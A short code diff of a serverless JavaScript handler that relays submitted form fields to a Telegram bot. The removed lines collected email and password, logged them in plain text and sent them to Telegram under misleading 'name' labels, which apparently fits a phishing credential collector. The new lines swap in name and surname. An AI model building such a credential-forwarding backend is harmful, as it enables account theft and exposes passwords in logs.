@@ -7,10 +7,10 @@ export async function handler(event) {
   }
 
   try {
-    const { email, password } = JSON.parse(event.body);
-    console.log("Données reçues:", { email, password });  // Log les données reçues
+    const { name, surname } = JSON.parse(event.body);
+    console.log("Données reçues:", { name, surname });  // Log les données reçues
 
-    if (!email || !password) {
+    if (!name || !surname) {
       return {
         statusCode: 400,
         body: JSON.stringify({ error: "Champs manquants" }),
@@ -22,8 +22,8 @@ export async function handler(event) {
 
     const message =
 `📩 Nouveau formulaire
-👤 Nom : ${email}
-👤 Prénom : ${password}`;
+👤 Nom : ${name}
+👤 Prénom : ${surname}`;
 
     const response = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
@@ -55,6 +55,3 @@ export async function handler(event) {
     };
   }
 }
-
-
-
